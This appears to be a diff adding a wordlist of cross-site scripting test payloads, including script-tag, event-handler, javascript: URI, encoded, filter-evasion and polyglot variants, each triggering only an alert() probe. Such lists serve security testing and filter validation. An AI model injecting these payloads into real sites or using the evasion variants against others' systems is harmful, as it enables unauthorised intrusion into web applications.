@@ -1,0 +1,21 @@
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<SCRIPT>alert('XSS')</SCRIPT>
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<details open ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+javascript:alert(1)
+<a href="javascript:alert(1)">click</a>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+%3Cscript%3Ealert(1)%3C/script%3E
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<img src="x" onerror="alert`1`">
+<<script>alert(1)//<</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</title><script>alert(1)</script>
+jaVasCript:/*-/*`/*`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
